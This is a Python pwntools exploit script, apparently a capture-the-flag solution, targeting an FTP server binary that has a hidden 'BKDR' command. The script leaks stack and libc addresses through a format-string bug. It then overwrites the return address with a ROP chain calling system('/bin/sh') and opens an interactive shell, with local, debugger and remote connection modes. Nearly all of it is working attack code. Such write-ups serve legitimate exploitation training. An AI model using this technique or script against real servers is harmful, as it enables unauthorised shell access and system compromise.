#!/usr/bin/env python3

# The FTP commands in the binary are:

# USER
# PASS
# RETR
# STOR
# STOU
# APPE
# REST
# RNFR
# RNTO
# ABOR
# DELE
# RMD
# MKD
# PWD
# CWD
# CDUP
# LIST
# NLST
# SITE
# STAT
# HELP
# NOOP
# TYPE
# PASV
# PORT
# SYST
# QUIT
# MDTM
# SIZE
# BKDR  <-- not a normal FTP command

from pwn import *

e = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], gdbscript='''
                      set breakpoint pending on
                      b __libc_start_main
                      commands 1
                        set $a = $rdi + 9
                        b *$a
                        commands 2
                            si
                            # we need to manually execute below commands to set breakpoint on the BKDR command
                            b *($rip+0x73d)
                            # ret
                            b *($rip+0xe8a)
                        end
                        c
                      end
                      c
                      '''.strip(), stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def exec_fmt(payload):
    r = conn()
    r.sendlineafter(b'FTP', b'USER ;)')
    r.sendlineafter(b'need password', b'PASS ;)')
    r.sendlineafter(b'proceed', b'BKDR ' + payload)
    data = r.clean(timeout=0.5)
    r.close()
    return data


def main():
    # There is an FSB vulnerability in BKDR command.

    # (Note that although we can overwrite the rbp-0x10 to non-negative vaule so that we can execute LIST command, the result shows that there is no flag.txt.
    # Instead, we have to run get_flag binary in the same diretory. So we still need to get the shell.)

    # The following auto-detection didn't work because it stops at 999
    # autofmt = FmtStr(execute_fmt=exec_fmt)
    # offset = autofmt.offset
    # info(f'Offset is {offset}')

    r = conn()

    r.sendlineafter(b'FTP', b'USER ;)')
    r.sendlineafter(b'need password', b'PASS ;)')

    r.sendlineafter(b'proceed', b'BKDR ' + b'%5$p')
    r.recvline()
    data = r.recvline()
    leaked_stack = int(data.split()[2], 16)
    # A debugging example:
    # rbp: 0x00007ffe611156c0, leak: 0x7ffe6110eff0, => diff: 66d0
    rbp = leaked_stack + 0x66d0
    info(f'rbp is {hex(rbp)}')

    # rsp: 0x00007fff950add70, return address to __libc_start_main stored at: 0x7fff950b32d8, diff: 0x5568
    # So we can try %n$p whose n is from 0x5568 / 8 = 2733.
    r.sendline(b'BKDR ' + b'%2739$p')
    data = r.recvline()
    leaked_stack = int(data.split()[2], 16)
    libc_start_main = leaked_stack - 213
    info(f'__libc_start_main is at {hex(libc_start_main)}')
    libc.address = libc_start_main - libc.sym.__libc_start_main
    info(f'libc is at {hex(libc.address)}')
    info(f'system() should be at {hex(libc.sym.system)}')

    # A debugging example:
    # backdoor_buff_start: 0x00007ffe81a8e360, rsp: 0x00007ffe81a8c360.
    # So there are 0x2000 between RSP and buff. It is 1024 * 8 bytes. (%p -> 8 bytes).
    # So Use the following to find the offset:
    # r.sendline(b'BKDR ' + b'AAAAAAAA%1024$p|%1025$p|%1026$p|%1027$p|%1028$p|%1029$p|%1030$p|%1031$p|%1032$p|%1033$p|%1034$p|%1035$p|%1036$p|%1037$p|%1038$p|%1039$p|%1040$p|%1041$p')
    offset = 1031

    ret_addr = next(libc.search(asm('ret'), executable=True))
    pop_rdi_addr = next(libc.search(asm('pop rdi; ret'), executable=True))
    bin_sh_addr = next(libc.search(b'/bin/sh'))
    payload = fmtstr_payload(offset=offset,
                             numbwritten=12, # '431136 BKDR ' at the beginning
                             writes={
                                 rbp + 8: ret_addr,
                                 rbp + 16: pop_rdi_addr,
                                 rbp + 24: bin_sh_addr,
                                 rbp + 32: libc.sym.system,
                            })
    info(f'payload has size {len(payload)}')
    r.sendline(b'BKDR ' + payload)

    r.sendline(b'QUIT')

    r.interactive()

if __name__ == "__main__":
    main()
